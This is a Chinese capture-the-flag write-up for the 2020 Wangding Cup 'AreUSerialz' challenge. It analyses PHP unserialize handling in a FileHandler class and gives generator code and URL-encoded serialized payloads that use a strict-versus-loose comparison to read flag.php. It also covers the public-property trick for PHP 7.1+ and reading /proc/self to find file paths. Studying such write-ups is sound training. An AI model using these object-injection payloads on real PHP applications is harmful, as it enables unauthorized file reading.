# \[网鼎杯 2020 青龙组]AreUSerialz

## \[网鼎杯 2020 青龙组]AreUSerialz

## 考点

* 逻辑漏洞，两次比较方式不一样，一个强比较一个弱比较
* PHP在7.1版本以上属性类型不敏感，在序列化时候把属性改为`public`就可以绕过
* 在`__destruct()`中读取文件用绝对路径

## wp

给了代码，先看入口

```php
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }
}
```

传入参数`str`，使用`is_valid()`判断是否满足条件，满足条件就对它反序列化。条件是`str`中字符的范围要在`[32, 125]`内。

然后再看给的`FileHandler`类，从`__destruct()`开始，然后对属性值做改变，最后执行`process()`函数

```php
function __destruct() {
    if($this->op === "2")
        $this->op = "1";
    $this->content = "";
    $this->process();
}
```

然后看`process()`函数，其中又调用了`write()`，`read()`和`output()`函数

```php
private function write() {
	if(isset($this->filename) && isset($this->content)) {
		if(strlen((string)$this->content) > 100) {
			$this->output("Too long!");
			die();
		}
		$res = file_put_contents($this->filename, $this->content);
		if($res) $this->output("Successful!");
		else $this->output("Failed!");
	} else {
            $this->output("Failed!");
	}
}
private function read() {
	$res = "";
	if(isset($this->filename)) {
		$res = file_get_contents($this->filename);
	}
	return $res;
}
private function output($s) {
	echo "[Result]: <br>";
	echo $s;
}
```

`write()`函数向`$this->filename`中写入`$this->content`，

`read()`函数读取`$this->filename`

`output()`函数输出字符串

再看`process()`函数，如果`$this->op`是`1`，就是写入文件，`$this->op`是`2`就是读取文件并输出，否则就输出`Bad Hacker`

```php
public function process() {
	if($this->op == "1") {
		$this->write();
	} else if($this->op == "2") {
		$res = $this->read();
		$this->output($res);
	} else {
		$this->output("Bad Hacker!");
	}
}
```

在`__destruct()`中`$this->op`的判断使用的`==="2"`强等于，而在`process()`中`$this->op`的判断使用的`=="2"`弱等于，可以使用`int`型的`2`绕过

```php
<?php
class FileHandler{

    protected $op = 2;
    protected $filename = 'flag.php';
    protected $content = '1';
}
echo urlencode(serialize(new FileHandler()));
```

得到结果如下，但是`protected`属性在序列化时会加上`%00`，这不符合输入要求。<mark style="background-color:orange;">PHP在7.1版本以上属性类型不敏感，在序列化时候把属性改为</mark><mark style="background-color:orange;">`public`</mark><mark style="background-color:orange;">就可以绕过</mark>。

```
O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3Bs%3A1%3A%221%22%3B%7D
```

```php
<?php
class FileHandler{

    public $op = 2;
    public $filename = 'flag.php';
    public $content = '1';
}
echo urlencode(serialize(new FileHandler()));
```

```
O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A7%3A%22content%22%3Bs%3A1%3A%221%22%3B%7D
```

F12可以看到flag，原题是先读取`/proc/self/`目录找到配置文件，再去读flag，注意是用绝对路径。

## 小结

1. 细节很重要
